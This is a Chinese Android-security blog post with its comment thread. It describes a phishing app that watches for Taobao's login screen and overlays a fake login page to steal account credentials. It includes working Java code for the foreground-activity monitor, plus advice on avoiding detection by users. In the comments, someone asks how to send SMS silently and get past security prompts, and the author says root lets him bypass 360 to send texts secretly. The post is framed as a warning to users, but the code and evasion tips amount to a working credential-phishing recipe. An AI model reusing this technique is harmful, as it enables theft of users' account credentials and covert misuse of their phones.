@@ -1,0 +1,452 @@
+
+首页资讯精华论坛问答博客专栏群组更多 ▼
+
+ 
+您还未登录 !登录注册
+
+
+
+
+su1216
+
+
+博客
+微博
+相册
+收藏
+留言
+关于我
+
+
+
+
+.
+
+
+
+
+android安全问题（三） 钓鱼程序
+博客分类： android
+ 
+android病毒钓鱼账号安全 .
+
+
+导读：文本介绍一种钓鱼应用，讲述如何骗取用户的用户名和密码，无须root
+ 
+ 
+ 
+这个话题是继续android安全问题（二） 程序锁延伸的
+ 
+ 
+ 
+之前我已经展示了如何制作程序锁。当打开指定应用的时候，弹出一个密码页面。
+ 
+程序锁的话题虽然是和安全相关，但是这应该属于防范的范围，如果被人恶意利用，那么后果……
+ 
+这期我来揭示一下一种钓鱼程序的原理，希望广大用户不要上当受骗，最主要的是：希望大家意识到安全问
+ 
+ 
+ 
+之前我用定时扫描activity的方法来检查打开的页面是不是我们所需要的页面
+ 
+
+
+Java代码  
+1.ComponentName topActivity = mActivityManager.getRunningTasks(1).get(0).topActivity;  
+ 
+ 
+ 
+如何用于钓鱼呢？比如我打开了淘宝，然后想登录，查看一下我淘宝，这时候会打开下面这个页面
+ 
+
+
+ 
+ 
+从log中我们能得到其包和类的信息
+ 
+log 写道
+ 
+10-17 10:02:14.698: I/ActivityManager(246): Displayed com.taobao.taobao/com.taobao.tao.LoginActivity: +305ms
+ 
+恩，这就好办了，下面我只需改三处，程序锁这个应用就会变成调用应用
+ 
+第一个修改很简单，修改我们监听的包名和类名即可
+ 
+
+
+Java代码  
+1.String testPackageName = "com.taobao.taobao";  
+2.String testClassName = "com.taobao.tao.LoginActivity";  
+ 
+完整代码
+ 
+
+
+Java代码  
+1.public class LockTask extends TimerTask {  
+2.    public static final String TAG = "LockTask";  
+3.    private Context mContext;  
+4.    String testPackageName = "com.taobao.taobao";  
+5.    String testClassName = "com.taobao.tao.LoginActivity";  
+6.  
+7.    private ActivityManager mActivityManager;  
+8.  
+9.    public LockTask(Context context) {  
+10.        mContext = context;  
+11.        mActivityManager = (ActivityManager) context.getSystemService("activity");  
+12.    }  
+13.  
+14.    @Override  
+15.    public void run() {  
+16.        ComponentName topActivity = mActivityManager.getRunningTasks(1).get(0).topActivity;  
+17.        String packageName = topActivity.getPackageName();  
+18.        String className = topActivity.getClassName();  
+19.        Log.v(TAG, "packageName" + packageName);  
+20.        Log.v(TAG, "className" + className);  
+21.  
+22.        if (testPackageName.equals(packageName)  
+23.                && testClassName.equals(className)) {  
+24.            Intent intent = new Intent();  
+25.            intent.setClassName("com.example.locktest", "com.example.locktest.PasswordActivity");  
+26.            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  
+27.            mContext.startActivity(intent);  
+28.        }  
+29.    }  
+30.}  
+ 
+ 
+ 
+第二个修改有些技术含量，可能会需要一个专业的美工，来仿造一个淘宝的登录页面，就如上图所示的那样
+ 
+最后一个修改，当病毒获取了用户名和密码之后，就不要再继续监听了，不然次数多了肯定会被发现
+ 
+ 
+ 
+为了尽量不让用户察觉，可以把频率调高一些，比如500ms检查一次，这样用户就很难察觉了
+ 
+测试项目完整源码见附件，代码是以android4.0为基础写的（当然，我的钓鱼页面是简陋的，只是用于演示）
+ 
+ 
+ 
+ 
+ 
+无论是程序锁还是钓鱼程序，他们可能都担心耗电问题，因为耗电过多也会引起用户的注意
+ 
+我们可以降低检查频率（当然，钓鱼程序是不会这么干的）
+ 
+我们可以监控屏幕状态，当屏幕关闭的时候，我们可以停止监听，这时候也没有必要监听，当点亮的时候我们再监听
+ 
+如何监听屏幕状态？
+ 
+我们需要监听下面两个action
+ 
+ 
+ 
+Intent.ACTION_SCREEN_OFF
+ 
+Intent.ACTION_SCREEN_ON
+ 
+还有一个要求，就是要动态注册才可以，不能在manifest中注册
+ 
+其余的事情大家就自己实现吧
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+android手机root后的安全问题 （一）
+ 
+android手机root后的安全问题 （二）
+ 
+android手机root后的安全问题 （三）
+ 
+android手机root后的安全问题 （四）
+ 
+ 
+ 
+android安全问题（一） 静音拍照与被拍
+ 
+android安全问题（二） 程序锁
+ 
+android安全问题（三） 钓鱼程序
+ 
+android安全问题（四） 抢先开机启动 - 结果篇
+ 
+android安全问题（五） 抢先拦截短信 - 结果篇
+ 
+ 
+ 
+ 
+ 
+请大家不要用root的手机随意下载软件，更不要以任何借口制造任何病毒！
+ 
+ 
+ 
+ 
+ 
+转贴请保留以下链接
+ 
+本人blog地址
+ 
+http://su1216.iteye.com/
+ 
+http://blog.csdn.net/su1216/
+ 
+ 
+
+LockTest.tar.gz (470.1 KB)
+下载次数: 56
+
+
+
+1 
+顶
+
+5 
+踩.
+
+分享到： 
+.
+
+《Unix & Linux 大学教程》 - 第二十二章 ... | android安全问题（二） 程序锁
+
+2012-10-17 11:49
+浏览 1502
+评论(13)
+分类:移动开发
+相关推荐
+
+
+评论
+
+
+13 楼 su1216 2012-12-19   
+
+
+gundumw100 写道
+
+像有些信用卡管理软件，当银行发送短信过来的时候，它就截取到该短信，然后统计一个月消费的费用。截取到该短信的时候可能会弹出“XXX正试图接收短信，此操作可能产生危险，是否允许本次操作？”除非你勾选了“信任该软件，以后不再提示”。这样以后就不会有了。
+楼主可以下载一个卡牛试试！
+
+这些软件是哪出的？如果是银行出的，那可能值得信任
+如果用户信任这些软件，那就应该去360等程序中给其权限 
+
+12 楼 gundumw100 2012-12-19   
+
+像有些信用卡管理软件，当银行发送短信过来的时候，它就截取到该短信，然后统计一个月消费的费用。截取到该短信的时候可能会弹出“XXX正试图接收短信，此操作可能产生危险，是否允许本次操作？”除非你勾选了“信任该软件，以后不再提示”。这样以后就不会有了。
+楼主可以下载一个卡牛试试！
+ 
+
+11 楼 su1216 2012-12-19   
+
+
+gundumw100 写道
+
+关键是如何得到root权限，用户又不懂的喽，最好当用户第一次启动软件的时候就让它获得root权限，这个怎么弄？
+
+看我这个系列的帖子
+http://www.iteye.com/blogs/subjects/android_security 
+
+10 楼 su1216 2012-12-19   
+
+
+gundumw100 写道
+
+就是要让用户觉得这个软件是安全的！
+
+获取了root权限的软件才危险。。 
+
+9 楼 gundumw100 2012-12-19   
+
+就是要让用户觉得这个软件是安全的！
+ 
+
+8 楼 gundumw100 2012-12-19   
+
+关键是如何得到root权限，用户又不懂的喽，最好当用户第一次启动软件的时候就让它获得root权限，这个怎么弄？
+ 
+
+7 楼 su1216 2012-12-19   
+
+
+gundumw100 写道
+
+我的手机是小米1，我装了360，有可能是360搞的鬼！
+如何通过一个Button获得root权限？有的软件安装完会弹出对话框说需要root权限，这个怎么搞的？
+
+“如何通过一个Button获得root权限？”是什么意思？？
+
+有的软件安装完会弹出对话框说需要root权限，这个怎么搞的？
+执行su，superuser就会弹出提示 
+
+6 楼 su1216 2012-12-19   
+
+
+gundumw100 写道
+
+我的手机是小米1，我装了360，有可能是360搞的鬼！
+如何通过一个Button获得root权限？有的软件安装完会弹出对话框说需要root权限，这个怎么搞的？
+
+360有个叫主动防御的功能，就是这个功能拦截的
+
+我之前测试过，得到root权限后，我可以绕过360,偷偷的发短信
+至于偷偷接收短信，我觉得也可以，这个你自己研究吧 
+
+5 楼 gundumw100 2012-12-19   
+
+我的手机是小米1，我装了360，有可能是360搞的鬼！
+如何通过一个Button获得root权限？有的软件安装完会弹出对话框说需要root权限，这个怎么搞的？
+ 
+
+4 楼 su1216 2012-12-19   
+
+
+gundumw100 写道
+
+LockTest正试图接收短信，此操作可能产生危险，是否允许本次操作？
+NND，不能上图！这个提示应该你也碰到过吧？怎么避开它？
+
+你这是“默认”吗！
+这是什么360、LBE之类的东西弹出来的吧
+而且你的手机root过了，是吧 
+
+3 楼 gundumw100 2012-12-19   
+
+LockTest正试图接收短信，此操作可能产生危险，是否允许本次操作？
+NND，不能上图！这个提示应该你也碰到过吧？怎么避开它？
+ 
+
+2 楼 su1216 2012-12-19   
+
+
+gundumw100 写道
+
+如何悄悄的发送短信而不让用户察觉到？
+private void sendSMS(String content){
+ SmsManager smsManager = SmsManager.getDefault();
+ PendingIntent sentIntent = PendingIntent.getBroadcast(context, 0, new Intent(), 0);
+ smsManager.sendTextMessage(phoneNumber, null, content, sentIntent, null);
+ }
+默认会弹出警告框，如何避开它？
+
+
+
+默认会弹出警告框？？谁弹出的
+截图看看，我怎么没什么印象 
+
+1 楼 gundumw100 2012-12-19   
+
+如何悄悄的发送短信而不让用户察觉到？
+private void sendSMS(String content){
+ SmsManager smsManager = SmsManager.getDefault();
+ PendingIntent sentIntent = PendingIntent.getBroadcast(context, 0, new Intent(), 0);
+ smsManager.sendTextMessage(phoneNumber, null, content, sentIntent, null);
+ }
+默认会弹出警告框，如何避开它？
+
+ 
+
+发表评论
+
+ 您还没有登录,请您登录后再发表评论 
+
+
+
+
+
+
+su1216
+ 
+浏览: 65620 次
+性别: 
+来自: 北京
+
+
+
+最近访客 更多访客>>
+
+
+
+
+rimoer
+
+
+
+
+zht19880706
+
+
+
+
+heavensay
+
+
+
+
+woyaowenzi
+.
+
+博客专栏
+深入入门正则表达式（jav...
+浏览量：6019.android手机的安全问...
+浏览量：18362.
+
+文章分类
+■全部博客 (93)
+■android (37)
+■Unix & Linux 大学教程 (22)
+■Linux命令行与shell脚本编程大全 (10)
+■java (5)
+■java多线程 (3)
+■虚拟机 (7)
+■设计模式 (1)
+■正则表达式 (6)
+■数据库 (1)
+■其他 (1)
+■转贴 (1)
+
+
+社区版块
+■我的资讯 (0)
+■我的论坛 (70) 
+■我的问答 (19)
+
+
+存档分类
+■2013-02 (1)
+■2013-01 (5)
+■2012-12 (7)
+■更多存档...
+
+
+评论排行榜
+■android手机root后的安全问题 （二）
+■android安全问题（二） 程序锁
+■android安全问题（四） 抢先开机启动 - ...
+■android安全问题（三） 钓鱼程序
+■android手机root后的安全问题 （一）
+
+
+最新评论
+N_HH： su1216 写道N_HH 写道那个，请问，pm是什么。。不懂 ...
+android手机root后的安全问题 （四）
+su1216： N_HH 写道那个，请问，pm是什么。。不懂。shell@an ...
+android手机root后的安全问题 （四）
+N_HH： 那个，请问，pm是什么。。不懂。
+android手机root后的安全问题 （四）
+su1216： tjwink 写道既然已经知道su的数据库地址，可以直接用DB ...
+android手机root后的安全问题 （三）
+tjwink： 既然已经知道su的数据库地址，可以直接用DBOpenHelpe ...
+android手机root后的安全问题 （三）
+
+.
+
+
+--------------------------------------------------------------------------------
+声明：ITeye文章版权属于作者，受法律保护。没有作者书面许可不得转载。若作者同意转载，必须以超链接形式标明文章原始出处和作者。
+© 2003-2012 ITeye.com. All rights reserved. [ 京ICP证110151号 京公网安备110105010620 ] 
+.
